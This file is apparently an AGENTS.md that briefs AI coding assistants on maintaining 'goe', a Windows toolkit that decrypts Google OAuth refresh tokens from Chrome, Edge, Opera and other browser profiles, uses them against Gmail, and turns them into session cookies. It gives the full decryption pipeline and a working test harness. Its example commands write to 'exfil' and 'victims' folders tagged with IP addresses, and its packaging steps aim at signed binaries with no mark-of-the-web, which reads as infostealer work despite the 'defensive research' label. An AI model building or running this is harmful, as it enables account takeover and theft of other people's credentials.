# AGENTS.md — Google OAuth Token Extractor Toolkit

This file is written for AI coding assistants (Cline, Copilot, etc.) working in
`google-oauth-extractor`. Read it before changing anything: it records the
conventions, the domain rules, and the environment-specific traps that are
expensive to rediscover.

> **Scope:** educational / defensive security research only. See `README.md`.

---

## 1. Project Identity

A Python CLI toolkit that harvests `1//...` Google OAuth **refresh tokens** from
Chromium-based browser profiles on Windows, validates and post-exploits them via
the Gmail API, and converts them into browser session cookies.

- **Three scripts, one entry point.** `extract_tokens_windows.py`,
  `test_token.py` and `token_to_session.py` each run standalone *and* are
  reachable as subcommands of `pyz/__main__.py`.
- **Three shipped artifacts**, all built from that one entry point:
  - `dist/goe.pyz` — zipapp; target needs Python + deps.
  - `dist/goe.exe` — PyInstaller onefile; target needs nothing.
  - `dist/goe-portable\` (+ `.zip`) — embeddable Python 3.13.15 + deps + the pyz;
    target needs nothing *and* launches a signed `python.exe`.
- **Windows-only** for extraction (DPAPI). The `requests`-based scripts are
  cross-platform.
- Prose product name is "Google OAuth Token Extractor Toolkit". **The artifacts
  are named `goe`** — keep them that way; do not reintroduce the long name.

---

## 2. Repository Layout

```
google-oauth-extractor\
├── AGENTS.md                     # This file
├── README.md                     # User-facing instructions
├── requirements.txt              # Runtime deps (pywin32/pycryptodome behind win32 markers)
├── extract_tokens_windows.py     # Command 1: live extraction (Windows only)
├── test_token.py                 # Command 2: validation + Gmail post-exploitation
├── token_to_session.py           # Command 3: token -> browser session cookies
├── pyz\
│   └── __main__.py               # *** SINGLE ENTRY POINT for BOTH artifacts ***
├── build_pyz.py                  # Recipe: -> dist\goe.pyz   (stdlib zipapp)
├── build_exe.py                  # Driver:  -> dist\goe.exe  (PyInstaller)
├── build_portable.py             # Recipe: -> dist\goe-portable\ + .zip
├── goe.spec                      # PyInstaller recipe — COMMITTED, edit this
├── portable\
│   ├── goe.cmd                   # Launcher, copied into the bundle
│   └── README.txt                # Reader-facing notes, copied into the bundle
├── docs\
│   ├── TOKEN_EXTRACTION_WINDOWS.md   # Where tokens live, crypto chain, ABE, failure modes
│   ├── PACKAGING_PYTHON_CLI.md       # Freezers vs zipapp; §10 = Windows trust (MOTW/SAC)
│   ├── TOKEN_BINDING_REALITY.md      # What tokens are/aren't bound to
│   ├── GMAIL_BROWSER_ACCESS.md       # Cookie-swap guide
│   ├── google-oauth-tokens-tutorial.md
│   └── google-oauth-tokens-validation.md
├── dist\                         # BUILD OUTPUT            (gitignored)
│   ├── goe.pyz                   #   zipapp   ~56 KiB
│   ├── goe.exe                   #   onefile  ~12.5 MiB
│   ├── goe-portable\             #   embedded Python + deps + pyz   49.5 MiB
│   └── goe-portable.zip          #   the same, zipped for transfer  23.3 MiB
├── build\                        # Scratch: build\pyz_app\, build\goe\  (gitignored)
├── .venv-build\                  # Pinned build env for PyInstaller      (gitignored)
└── output_tokens\                # Extracted PLAINTEXT TOKENS            (gitignored)
```

### Key files an agent must understand

| File | Role | Agent action |
|---|---|---|
| `pyz/__main__.py` | Dispatcher; entry point for the `.pyz` **and** the `.exe` | Edit to add commands. Never break its argv contract (see §3) |
| `extract_tokens_windows.py` | Chromium `Web Data` -> decrypted tokens | Primary target for extraction work |
| `test_token.py` | Refresh/validate tokens; Gmail API post-ex | Keep `--help` docstring current |
| `token_to_session.py` | `1//` token -> `SAPISID`/`SSID` cookies | Manually parses `sys.argv` |
| `build_pyz.py` | `.pyz` recipe (stdlib `zipapp`) | Run after changing any script |
| `build_exe.py` + `goe.spec` | `.exe` recipe | Change name/flags **here**, never in `dist\` |
| `docs/TOKEN_EXTRACTION_WINDOWS.md` | Domain reference (crypto, ABE, failures) | Keep in sync with code changes |

---

## 3. How It Works (Agent's Mental Model)

### The dispatcher (`pyz/__main__.py`)

Shared by both artifacts — there is no second entry point.

```
goe extract [opts]   -> extract_tokens_windows.main()
goe test <args>      -> test_token.main()
goe session <args>   -> token_to_session.main()
goe --help | --version | (no args -> usage, exit 1)
```

Three behaviours that must not regress:

1. **Lazy `importlib.import_module`.** The three command modules are imported
   *only* when selected. `extract_tokens_windows` calls `sys.exit(1)` at import
   time when `pywin32`/`pycryptodome` are missing, so eager imports would break
   `--help` and the other subcommands.
2. **The subcommand is stripped before delegating.** `sys.argv` is rebuilt as
   `[f"{prog} {command}"] + rest` and then `module.main()` is called, so each
   script's own parsing sees exactly what it would as a standalone script
   (`test_token` reads `sys.argv[1:]`; `token_to_session` reads `sys.argv[1]` and
   loops from index 2).
3. **Exit codes propagate.** `SystemExit` from the delegated `main()` is caught
   and returned: no-args `1`, unknown command `2`, argparse errors `2`,
   `--help`/`--version` `0`.

Because the imports are dynamic, `goe.spec` **must** list them in
`hiddenimports` — static analysis cannot see them.

### The extraction pipeline (`extract_tokens_windows.py`)

```
Local State  --DPAPI-->  32-byte AES master key
   os_crypt.encrypted_key (base64, "DPAPI" + CryptProtectData blob)

User Data\<Profile>\Web Data  (SQLite, copied to %TEMP% first to dodge locks)
   -> PRAGMA table_info(token_service)
   -> SELECT encrypted_token[, account_id] WHERE service LIKE '%google%'
   -> AES-256-GCM decrypt  ([vXX][nonce 12][ct][tag 16])
   -> write token_<browser>_<profile>_<gaia>.txt + all_tokens.txt + extraction_report.txt
```

`BROWSER_PATHS` covers `chrome`, `edge`, `brave`, `vivaldi`, `yandex`, `opera`
and is the **single source of truth** for the CLI's `--browser` choices
(`choices=sorted(BROWSER_PATHS)`) — add a browser there, not in `argparse`.

---

## 4. Commands

```bat
:: --- run (interpreted) ---
py dist\goe.pyz --help
py dist\goe.pyz extract --browser yandex --output C:\exfil
py dist\goe.pyz test  victims\PH_112.201.133.55\
py dist\goe.pyz session victims\PH_112.201.133.55\token_01.txt

:: --- build all three artifacts ---
python build_pyz.py                                     :: -> dist\goe.pyz  (instant)
.venv-build\Scripts\python build_exe.py --clean --run    :: -> dist\goe.exe  (~25 s)
.venv-build\Scripts\python build_portable.py --clean     :: -> dist\goe-portable\ + .zip (~45 s)
```

The `.exe` build **must** use the pinned venv (`.venv-build`); that is what keeps
the artifact lean. Recreate it with:

```bat
python -m venv .venv-build
.venv-build\Scripts\python -m pip install -r requirements.txt pyinstaller
```

**Rebuild both artifacts after touching any script** — `dist\` is generated, not
source. Never hand-edit `dist\goe.exe`; edit `goe.spec` / `build_exe.py`.

---

## 5. Environment

| Item | Value |
|---|---|
| OS | Windows 11 Home (10.0.26200), PowerShell 5.1 |
| Interpreter | Python 3.13.15 (`py` launcher available) |
| Build venv | `.venv-build\` — PyInstaller 6.22.3 |
| Runtime deps | requests 2.34.2, pycryptodome 3.23.0, pywin32 312 |
| Artifacts | `dist\goe.pyz` ~56 KiB · `dist\goe.exe` ~12.5 MiB · `dist\goe-portable\` 49.5 MiB (`goe-portable.zip` 23.3 MiB) |
| Bundled interpreter | Python **3.13.15** embeddable (`python-3.13.15-embed-amd64.zip`) — pinned to match the venv |
| Onefile startup | ~1.0 s (self-extracts to `%TEMP%` on every launch) |
| Portable startup | immediate (no extraction) |

---

## 6. Conventions

- **Plain stdlib scripts.** No third-party libs beyond `requests` /
  `pycryptodome` / `pywin32`. No frameworks, no packaging metadata.
- **Logging is `print()`** with prefixes: `[+]` ok, `[-]` none/fail, `[~]` in
  progress, `[!]` warning. Match it.
- **Arg parsing:** `argparse` in `extract_tokens_windows.py`; hand-rolled
  `sys.argv` loops in `test_token.py` / `token_to_session.py`. Do not
  "modernise" one to match the other — their contracts are documented in
  `README.md` and exercised by the dispatcher.
- **Module docstrings carry the usage block** and are what `--help` prints for
  two of the three commands. Keep them accurate.
- **ASCII-only in `print()` output** (console code page mangles anything else).
- **`__all__`/type hints are not used.** Don't introduce a new style in one file.
- **Section banners** in the scripts: `# --- Helpers ---`, `# --- Cryptography ---`,
  `# --- Main Entry Point ---`. Place new helpers under the right banner.
- **Docs are part of the change.** Behaviour changes touch `README.md` and the
  relevant `docs\*.md`; build changes touch `docs\PACKAGING_PYTHON_CLI.md`.

---

## 7. Critical Gotchas — Domain (do not regress)

| # | Gotcha | Why it matters |
|---|---|---|
| 1 | **Opera is the outlier.** Profile lives under `%APPDATA%` (Roaming), and `Web Data` sits directly in `Opera Stable`, not a `Default\` subdir. | `PROFILE_DIRS` begins with `""` (the user_data root) purely for this. Do not "tidy it away". |
| 2 | **`token_service` dropped `account_id`** upstream. | Gaia ID must be parsed from the token suffix (`1//payload:GAIA`). Keep the `has_account_id` fallback for older builds. |
| 3 | **Blobs may or may not carry a `vXX` prefix.** | Prefix stripping is **exact-match only**. Never strip unconditionally, never assume a prefix exists — the bare format is what `token_service` has historically used. |
| 4 | **`v20` = App-Bound Encryption** (Chrome 127+, July 2024). | Raise `AppBoundEncryptionError` for that *row*; do **not** abort the run — sibling `v10` rows in the same DB are still readable. `os_crypt.app_bound_encrypted_key` in `Local State` is a **warning**, not fatal. |
| 5 | **`win32crypt` return shapes differ.** | `CryptProtectData` -> **bare `bytes`**; `CryptUnprotectData` -> **`(desc, data)` tuple** (hence the `[1]`). Verify before "fixing" either call. |
| 6 | **Copy `Web Data` before reading.** | A running browser's WAL makes a naive copy stale. Read the copy; remove it in `finally`. |
| 7 | **ABE rollout is version-dependent.** | Google migrated *cookies* first and listed "other persistent authentication tokens" as future work — so whether rows are `v20` depends on the build. Never assume v20 is universal, or absent. |
| 8 | **Docs/code drift has already happened once.** | The docs listed Opera/Vivaldi paths long before `BROWSER_PATHS` supported them. When changing browsers, update code **and** docs **and** `--help`. |
| 9 | **Output filenames collide on Gaia ID.** Files are named `token_<browser>_<profile>_<gaia>.txt`, so two rows for the *same account* in one profile overwrite each other on disk. | Both rows are still kept in `all_tokens.txt` / `extraction_report.txt`. The scheme is documented in `README.md` — don't change it casually. |
| 10 | **`import site` in the embed's `pythonNNN._pth` is mandatory.** A `._pth` file suppresses `site` by default, so no `.pth` is processed. | `pywin32.pth` adds `win32\lib` and runs `import pywin32_bootstrap`; the bootstrap registers `pywin32_system32`. Without `site` the failure is a **DLL-load error**, not a clean `ImportError` — easy to misdiagnose. |
| 11 | **The embeddable dist is more complete than folklore says.** It already ships `_sqlite3.pyd` + `sqlite3.dll`, `_ssl.pyd` + `libssl-3.dll`/`libcrypto-3.dll`, `_socket`, `select`, `_hashlib`, `unicodedata`. | Do **not** hand-copy DLLs next to `python.exe` "to be safe" — it was unnecessary here and only obscures future debugging. |
| 12 | **Wheel pinning differs per package.** `pycryptodome` resolves to `cp37-abi3-win_amd64` (works on any CPython >= 3.7); `pywin32` ships version-specific wheels (`cp312`, `cp313`, `cp314`, …). | This is why the portable bundle pins 3.13.15 to match the venv: pywin32 locks you to the exact interpreter version. |
| 13 | **The portable bundle is intentionally NOT pruned.** `site-packages` carries `win32com`, `pythonwin`, `isapi`, `adodbapi` and the full embed stdlib. | Leave it. Deletions are runtime risk, and spare capacity is wanted for future features. Only prune on explicit instruction, with an import test after. |

---

## 8. Critical Gotchas — Windows / PowerShell tooling

| # | Trap | Do this instead |
|---|---|---|
| 1 | **Commands are hard-capped (~30 s)** — PyInstaller builds (~25 s) and `pip install` exceed it and get killed mid-run | Launch detached, then poll: `Start-Process -FilePath <exe> -ArgumentList @(...) -WorkingDirectory <dir> -NoNewWindow -PassThru -RedirectStandardOutput <log> -RedirectStandardError <err>`, then check `Test-Path <artifact>` / `Get-Content <log> -Tail 15` |
| 2 | `cmd /c "... & echo %ERRORLEVEL%"` prints the value from **before** the command — `%VAR%` expands when the line is parsed | Read real codes from `(Start-Process ... -PassThru).ExitCode` |
| 3 | A native program writing to **stderr** becomes a terminating `NativeCommandError`; the whole command is reported failed | Redirect stderr to a file (`-RedirectStandardError`) rather than `2>&1` |
| 4 | Piping into `Select-Object -First N` closes the pipe and `$LASTEXITCODE` then reports **`-1`** | Never wrap a command whose exit code you are asserting |
| 5 | **Rebuilding an artifact while another process reads/runs it** produced a bogus `SyntaxError: source code cannot contain null bytes` (Python opened a half-written `.pyz`) | Always serialise: build to completion, *then* test |
| 6 | Non-ASCII in `print()` mojibakes under the console code page | ASCII only — `-` not `—`, `->` not the arrow |
| 7 | `python -c "..."` with nested quotes gets mangled by PowerShell | Write a temp `.py` file and run that |
| 8 | `py_compile` / imports leave `__pycache__` | gitignored; delete for a pristine tree |

---

## 9. Testing & Verification

There is **no test framework** in this repo. Verification means building both
artifacts and driving them.

Fast loop after any script edit:

```bat
python -m py_compile extract_tokens_windows.py test_token.py token_to_session.py pyz\__main__.py
python build_pyz.py
py dist\goe.pyz --help & py dist\goe.pyz extract --help & py dist\goe.pyz test --help & py dist\goe.pyz session --help
```

Exit-code matrix (check via `Start-Process -PassThru`): no-args -> `1`,
unknown command -> `2`, bad `--browser` -> `2`, `--help`/`--version` -> `0`.

### Synthetic profile harness (preferred — never touches real profiles)

```python
# temp file; run with the repo on sys.path
import base64, json, os, sqlite3, sys, tempfile, pathlib
sys.path.insert(0, r"C:\Users\morpher\Documents\google-oauth-extractor")
import win32crypt
from Crypto.Cipher import AES
import extract_tokens_windows as ex

key = os.urandom(32)
def enc(tok, prefix=b""):                    # Chromium blob: [vXX][nonce 12][ct][tag 16]
    n = os.urandom(12)
    ct, tag = AES.new(key, AES.MODE_GCM, nonce=n).encrypt_and_digest(tok.encode())
    return prefix + n + ct + tag

d = pathlib.Path(tempfile.mkdtemp())
(d / "Local State").write_text(json.dumps({"os_crypt": {     # genuine DPAPI wrap
    "encrypted_key": base64.b64encode(b"DPAPI" + win32crypt.CryptProtectData(
        key, None, None, None, None, 0)).decode()}}), encoding="utf-8")

c = sqlite3.connect(d / "Web Data")
c.execute("CREATE TABLE token_service (service TEXT, encrypted_token BLOB)")
c.executemany("INSERT INTO token_service VALUES (?,?)",
              [("https://accounts.google.com/OAuth2Login/GAIA_SID", b) for b in (
                  enc("1//TOK:12345"),
                  enc("1//TOK:12345", b"v10"),
                  b"v20" + enc("x"))])
c.commit(); c.close()

ex.BROWSER_PATHS["_t"] = {"name": "T", "user_data": str(d),   # root layout = Opera
                          "local_state": "Local State", "web_data": "Web Data"}
print(ex.extract_browser("_t", pathlib.Path(".")))            # 2 extracted, v20 skipped
```

Put `Web Data` under `d / "Default"` for the Chrome/Edge layout; add
`app_bound_encrypted_key` to `os_crypt` to exercise the ABE warning.

Keep asserting, when you touch crypto: `decrypt_token` round-trips bare / `v10` /
`v11`; raises `AppBoundEncryptionError` on `v20`; raises `ValueError` on a
too-short blob; `get_master_key` yields `(key, False)`, `(key, True)` and
`(None, True)` for the three `Local State` shapes.

### Artifact checks (these catch packaging bugs)

```bat
dist\goe.exe extract --help    :: must show argparse, NOT "ERROR: pywin32 not installed"
dist\goe.exe test --help       :: proves requests is bundled
:: then, with PATH stripped to System32 (no python resolvable) -> proves CPython is embedded:
dist\goe.exe extract --browser yandex --output %TEMP%\x
```

Also run from a different CWD and from a path containing spaces.

For the portable bundle — all four of these are automated by
`build_portable.py`'s self-test, so a successful build already covers them:

```bat
dist\goe-portable\python\python.exe -c "import win32crypt, Crypto.Cipher.AES, requests, sqlite3, ssl"
dist\goe-portable\goe.cmd --version
powershell -c "(Get-AuthenticodeSignature dist\goe-portable\python\python.exe).Status"   :: Valid = PSF
powershell -c "(Get-Item dist\goe-portable\python\python.exe -Stream *).Stream"           :: only :$DATA = no MOTW
```

---

## 10. Safety & Secrets Policy

- Extracted `1//` tokens are **bearer credentials**. Treat `output_tokens\`,
  the `dist\` artifacts and any token file as sensitive.
- **Never print a full token.** A prefix (<= 45 chars) is fine.
- **Do not run `extract` against profiles you are not authorised to audit.**
  `--all-browsers` / `--browser chrome` decrypts and writes every token it finds
  to plaintext files. Use the §9 harness instead.
- Never commit artifacts or output — `dist/`, `build/`, `.venv-build/`,
  `output_tokens/` are gitignored; keep it that way.
- Only the account owner can revoke a stolen token (Google "sign out of all
  sessions"); revocation is not something this tool can do.

---

## 11. Definition of Done

- [ ] changed scripts compile (`python -m py_compile ...`)
- [ ] every subcommand `--help` works; exit-code matrix unchanged (1 / 2 / 2 / 0)
- [ ] all three artifacts rebuilt — `build_pyz.py`, `build_exe.py --clean --run`,
      `build_portable.py --clean` (the portable build self-tests as part of itself)
- [ ] `goe.exe extract --help` prints argparse — proof the deps are bundled
- [ ] docs updated: `README.md`, the relevant `docs\*.md`, and this file if a
      convention moved
- [ ] commits contain **recipes** (`goe.spec`, `build_*.py`, `pyz\__main__.py`),
      never artifacts or extracted tokens

